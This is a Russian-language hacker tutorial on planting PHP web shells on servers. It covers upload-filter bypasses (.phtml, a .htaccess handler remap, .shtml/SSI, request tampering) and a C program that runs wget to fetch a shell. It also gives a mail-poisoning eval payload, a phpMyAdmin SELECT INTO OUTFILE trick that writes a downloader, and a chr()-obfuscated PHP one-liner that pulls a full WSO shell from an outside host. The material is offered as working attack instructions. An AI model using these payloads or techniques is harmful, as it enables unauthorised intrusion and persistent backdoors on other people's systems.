# Не Стандартное Внедрение Шелла 
Эту статью вам нужно читать в двух случаях: 
1. Для общего развития 
2. Если у вас не получается штатными методами залить шелл.

## Обход фильтрации 

Допустим, формат .php не заливается, также .php2/.php3/.php4/.php5/.php.jpg/.php.abc.
Варианты решения: 
1. Phtml 
Попробуйте залить .phtml - это также расширение семейства PHP. 
2. htaccess 
Создаём файлик .htaccess, и вписываем в него следующее: 
AddType application/x-httpd-php .jpg 
AddHandler application/x-httpd-php .jpg 
Сохраним.. там, где .jpg можете указать любой понравившийся вам формат, хоть .hacker ( :D ). 
Теперь попробуем залить наш .htaccess и вслед за ним шелл, с расширением, указанным в .htaccess'e 
Примечание: .htaccess - файл дополнительной конфигурации веб-сервера Apache, а также подобных ему серверов. 
3. shtml 
Если методы выше не работают, то расскажу о очень интересном формате - ".shtml". 
SSI (Server Side Includes — включения на стороне сервера) — несложный язык для динамической «сборки» веб-страниц на сервере из отдельных составных частей и выдачи клиенту полученного HTML-документа. Реализован в веб-сервере Apache при помощи модуля mod_include. Включённая в настройках по умолчанию веб-сервера возможность позволяет подключать HTML-файлы, поэтому для использования инструкций файл должен оканчиваться расширением .shtml, .stm или .shtm 
Вся прелесть в том, что 95% администраторов либо вообще не знают что это такое, либо просто напросто забывают добавить этот формат в "чёрный список". А теперь советую поподробней прочитать, что это такое, залить такой файлик на сервер, и закачать шелл... 
Также бывает, что если мы создадим файл file.shtm?cmd=... то в большинстве случаев скрипт не хотел выполнять системные команды, которые содержат пробел. т.е. "id" он выполнял, "ls" - тоже, а "uname -a" - нет, потому что содержит пробел. Таким образом все фишки типа "wget http://shell.com/shell.php" обламывались. Но не отчаиваетесь - выход есть: 
Можно написать и скомпилировать програмку, которая выполняет системную команду скачивания шелла (через wget). скомпилировать, и залить её. Потом через SSI скрипт просто напросто выполнить её. 
Код примера программы: 
```C
#include <stdio.h> 
#include <stdlib.h> 

int main () 
{ 
system("wget [Путь_к_шеллу]"); 
return 0; 
} 
```
> Варианты shell.php.jpg тут не рассматриваются, т.к о них и так все знают. 

4. Tamper Data 
Ну, а этот вариант - это использовать плагин на подобии "Tamper Data" (Firefox). Можно перехватить запрос, и изменить расширение, но такой метод самый маловероятный. Обычно он спасает в тех случаях, если php не разрешает какой-нибудь JavaScript. 
5. баг Windows 
Пятый вариант - это отличный баг Windows, а именно, иногда сайт не разрешает закачивать PHP таким образом, что когда нажимаешь к примеру на кнопку "Обзор", то он показывает только файлы изображений, и т.п. Но не отчаивайтесь - просто нажмите на этот "Обзор" ( :D ) зайдите в директорию с шеллом, и наберите тут его имя: 
Картинка И нажмите "Открыть", шелл успешно откроется, и закачается ;) 
6. jpg 
Ну а этот метод не входит в "не стандартную" категорию, он заключается в том, что банальный создатель говорит, что разрешено дескать только .jpg и т.д, но на самом деле это не всегда так, достаточно залить PHP сценарий (шелл), и он будет отлично работать. Как вы поняли - никакой фильтрации нету полностью (ну или уж через чур кривая :D ) 
7. mail 
Например у нас есть какая-нить CMS-ка или даже просто самописный двиг, в котором где-то, куда-то иногда отправляются письма. Например, с активацией регистрации и так далее. Дело в том, что такие письма могут быть локально сохранены на nix-системах. Если рассматривать как пример форму активации аккаунта, то введем, например, как логин eval($_GET['c']); а как свое мыло впишем apache@localhost. Таким образом письмо будет отправлено на тот же демон хттпд и сохранено где-то в /var/mail с именем юзера хттпд. Думаю далее действия очевидны, имея, например, локальный инклуд мы можем прогрузить шелл инклудя письмецо с передачей кода загрузки шелла в параметре $_GET['c']. 

## Хитрости PhpMyAdmin 

Допустим, вы получили доступ к PhpMyAdmin, и вам даже посчастливилось, что File_Priv=Y и Обновление таблиц тоже = Y. Тогда нажимает SQL (Может называться и по другому, и она сверху ;) ). И вписываем следующее: 
```php
UPDATE `table_name` SET `column_name_1` = '<?php $url = "Путь_до_шелла";$content = file_get_contents($url);$h = fopen("shells.php","w");$text = "$content";fwrite($h,$text);fclose($h); ?>' WHERE `column_name_2` =[Значение] LIMIT 1 ; 
SELECT * FROM `table_name` WHERE `column_name_2` =[Значение] INTO OUTFILE '[Полный_путь_до_папки_с_правами_закачки_файла/shell.php]' ; 
```
Теперь переходим по адресу 
host.com/пут_до_той_папки_что_вы_указали/shells.php 
Пояснения: 
 - table_name - имя таблицы в БД. 
 - column_name_1 - эта колонка, которую мы будем "изменять". 
 - column_name_2 - это колонка, например id, показывает, какую именно запись в БД мы будем редактировать. Например, column_name_2=id, а table_name=users. 
Это значит, что мы будем изменять запись в таблице users, где id=n (любое число). 
Вы, вероятно обратили внимание, что весь php на одной строке и без пробелов, а это не случайность - это всё для вселюбимой PhpMyAdmin, если записать сюда код с переходами на другую строку, то он обязательно вставить "/" перед переходом, что соответственно вызовет ошибку в php скрипте. И ещё нельзя использовать ' ... 
Также можно вместо: 
```php
<?php $url = "Путь_до_шелла";$content = file_get_contents($url);$h = fopen("shells.php","w");$text = "$content";fwrite($h,$text);fclose($h); ?> 
```
Мы можем просто вписать: 
```php
<?php eval($_GET[cmd]); ?> 
```
Eval выполняет функции php, как вы видите, это мини шелл... используют так: 
host.com/пут_до_той_папки_что_вы_указали/shells.php?c..; 

## Мини-шелл 
Итак, опять же допустим, что вы закачали "мини шелл", но теперь бы вам надо залить нормальный, WSO к примеру. 
Пробуем: 
```php
http://host.ru/shell.php?cmd=$url = "Ссылка_на_шелл.txt";$content = file_get_contents($url);$h = fopen("shells.php","w");$text = "$content";fwrite($h,$text);fclose($h); 
```
Но тут очень часто бывает облом - либо нельзя, чтобы был пробел, либо нельзя, чтобы были кавычки. "Заброшу ка я сервер" - наверное подумали вы.. но нет, конечно, вы правы, чтобы задать тип переменной в php типа string, не мешало бы значение поместить в кавычки, а вот оказывается нет. Достаточно использовать функцию chr(); Эта функция "преобразовывает" ASCII в "обычный текст", таблицу таких символов можно взять тут - http://www.asciitable.com/ И соответственно, получаем код, к примеру (рабочий): 
```php
$url = chr(104).chr(116).chr(116).chr(112).chr(58).chr(47 ).chr(47).chr(108).chr(101).chr(103).chr(105).chr( 111).chr(110).chr(101).chr(114).chr(115).chr(56).c hr(56).chr(46).chr(110).chr(97).chr(114).chr(111). chr(100).chr(46).chr(114).chr(117).chr(47).chr(101 ).chr(114).chr(114).chr(111).chr(114).chr(46).chr( 116).chr(120).chr(116); 
Как видите, без кавычек, а тип будет String :p Так что теперь делаем код: 
$url = chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(108).chr(101).chr(103).chr(105).chr(111).chr(110).chr(101).chr(114).chr(115).chr(56).chr(56).chr(46).chr(110).chr(97).chr(114).chr(111).chr(100).chr(46).chr(114).chr(117).chr(47).chr(101).chr(114).chr(114).chr(111).chr(114).chr(46).chr(116).chr(120).chr(116);$content = file_get_contents($url);$h = fopen(shells.chr(46).php,w);$text = $content;fwrite($h,$text);fclose($h); 
```
И вставляем его в "?cmd=" и получаем в том же каталоге что и мини-шелл, настоящий, хороший шелл, который будет по адресу shells.php.. 
Заметка: Скорее всего, вы заметили, что у меня написано "shells.chr(46).php", а я объясню, 46 - это точка в "Dec", а имя файла у нас без кавычек, и если бы мы написали shells.php то он бы сохранился как shellsphp, то есть без расширения, т.к точка - это тоже функция в PHP, но я земенил её на shells.chr(46).php и получаем на выходе "shells.php". Вот так, удачи Вам! 
Это всего-лишь малая часть всех чудных способов не стандартной заливки, я просто пытался направить вас на путь, что выход есть всегда.